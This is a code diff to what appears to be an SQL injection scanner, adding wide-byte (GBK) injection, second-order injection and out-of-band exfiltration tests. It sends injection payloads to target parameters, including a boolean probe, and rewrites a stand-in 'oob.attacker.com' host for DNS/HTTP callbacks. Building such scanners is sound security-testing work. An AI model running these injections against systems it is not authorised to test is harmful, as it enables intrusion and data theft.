@@ -589,6 +589,187 @@ class SQLiTechniquesMixin:
                     self._found_vulns.append(vuln)
                     return
 
+    # ── Wide-Byte Injection ──────────────────────────────────────────────
+
+    async def _test_wide_byte(
+        self: "SQLiDetector",
+        url: str,
+        params: Dict[str, str],
+        param_name: str,
+        param_value: str,
+        method: str,
+        param_type: str,
+        baseline: Dict,
+        waf_prefix: List[str] = None,
+    ) -> None:
+        """Wide-byte injection detection (GBK/Big5 bypass for addslashes).
+
+        Tests URL-encoded multi-byte sequences that consume the backslash added
+        by addslashes/magic_quotes, leaving the quote unescaped.
+        """
+        from .payloads import get_wide_byte_payloads
+
+        payloads = get_wide_byte_payloads(limit=8)
+        for payload in payloads:
+            test_params = self._inject_param(params, param_name, payload)
+            resp = await self._send_request(method, url, test_params, param_type)
+            if resp is None:
+                continue
+
+            analyzer = ResponseAnalyzer(baseline)
+            is_error, db = analyzer.is_sql_error(resp)
+            if is_error:
+                if await self._verify_with_different_payload(url, params, param_name, method, param_type, "error"):
+                    vuln = self._create_vuln(
+                        url=url,
+                        param=param_name,
+                        param_type=param_type,
+                        method=method,
+                        payload=payload,
+                        vuln_type="error-based",
+                        confidence=Confidence.HIGH,
+                        db_type=db or "mysql",
+                        evidence=f"Wide-byte SQL error: {resp.get('text', '')[:200]}",
+                    )
+                    self._found_vulns.append(vuln)
+                    return
+
+            # Also check for boolean difference (wide-byte may not produce error)
+            bool_diff = self._check_boolean_diff(baseline, resp)
+            if bool_diff:
+                verify_payload = payload.replace("%df'", "%df' AND 1=2--")
+                test_params2 = self._inject_param(params, param_name, verify_payload)
+                resp2 = await self._send_request(method, url, test_params2, param_type)
+                if resp2 and self._check_boolean_diff(baseline, resp2):
+                    vuln = self._create_vuln(
+                        url=url,
+                        param=param_name,
+                        param_type=param_type,
+                        method=method,
+                        payload=payload,
+                        vuln_type="boolean-blind",
+                        confidence=Confidence.MEDIUM,
+                        db_type=db or "mysql",
+                        evidence=f"Wide-byte boolean difference detected",
+                    )
+                    self._found_vulns.append(vuln)
+                    return
+
+    # ── Second-Order SQLi ─────────────────────────────────────────────────
+
+    async def _test_second_order(
+        self: "SQLiDetector",
+        url: str,
+        params: Dict[str, str],
+        param_name: str,
+        param_value: str,
+        method: str,
+        param_type: str,
+        baseline: Dict,
+    ) -> None:
+        """Second-order SQL injection detection.
+
+        Tests endpoints that accept data which may be STORED in the database
+        and later used unsafely. Common targets: registration forms, profile
+        update, feedback/comments, support tickets.
+        """
+        from .payloads import get_second_order_payloads
+
+        # Only test POST endpoints (where data is submitted for storage)
+        if method.upper() != "POST":
+            return
+
+        # Skip non-form-like endpoints (no form-urlencoded or multipart data)
+        content_types = ("application/x-www-form-urlencoded", "multipart/form-data")
+        param_type_lower = (param_type or "").lower()
+        if param_type_lower not in ("form", "post", "data"):
+            return
+
+        payloads = get_second_order_payloads("create", limit=4)
+        for payload in payloads:
+            test_params = self._inject_param(params, param_name, payload)
+            resp = await self._send_request(method, url, test_params, param_type)
+            if resp is None:
+                continue
+
+            # Second-order success markers: payload was accepted (stored)
+            status = resp.get("status_code", 0)
+            text = (resp.get("text", "") or "")[:500].lower()
+            stored_ok = status in (200, 201, 302, 303)
+            stored_ok = stored_ok and not any(
+                m in text for m in ("error", "invalid", "not allowed", "failed")
+            )
+
+            if stored_ok:
+                vuln = self._create_vuln(
+                    url=url,
+                    param=param_name,
+                    param_type=param_type,
+                    method=method,
+                    payload=payload,
+                    vuln_type="second-order",
+                    confidence=Confidence.LOW,
+                    db_type="unknown",
+                    evidence=(
+                        f"Payload accepted (stored) — verify manually on profile/listing page: "
+                        f"{resp.get('text', '')[:150]}"
+                    ),
+                )
+                self._found_vulns.append(vuln)
+                return
+
+    # ── OOB (Out-of-Band) Exfiltration ────────────────────────────────────
+
+    async def _test_oob_exfil(
+        self: "SQLiDetector",
+        url: str,
+        params: Dict[str, str],
+        param_name: str,
+        param_value: str,
+        method: str,
+        param_type: str,
+        baseline: Dict,
+    ) -> None:
+        """OOB (out-of-band) data exfiltration detection.
+
+        Injects payloads that trigger DNS/HTTP callbacks to an external server.
+        Requires OOBManager to be configured (--oob-server).
+        """
+        from .payloads import get_oob_payloads
+
+        # Only run if OOB manager is available
+        oob_manager = getattr(self, '_oob_manager', None)
+        if oob_manager is None:
+            return
+
+        oob_url = oob_manager.get_collaborator_url()
+        payloads = get_oob_payloads("mysql", limit=3)
+
+        for payload in payloads:
+            # Inject OOB domain into payload
+            formatted_payload = payload.replace("oob.attacker.com", oob_url)
+            test_params = self._inject_param(params, param_name, formatted_payload)
+            resp = await self._send_request(method, url, test_params, param_type)
+            if resp is None:
+                continue
+
+            # Check if OOB callback was received
+            callbacks = await oob_manager.poll_for_callbacks(timeout=5)
+            if callbacks:
+                vuln = self._create_vuln(
+                    url=url,
+                    param=param_name,
+                    param_type=param_type,
+                    method=method,
+                    payload=formatted_payload,
+                    vuln_type="oob-exfiltration",
+                    confidence=Confidence.HIGH,
+                    db_type="unknown",
+                    evidence=f"OOB callback received: {callbacks[:300]}",
+                )
+                self._found_vulns.append(vuln)
+                return
+
     # ── Secondary Verification ────────────────────────────────────────────
 
     async def _verify_with_different_payload(
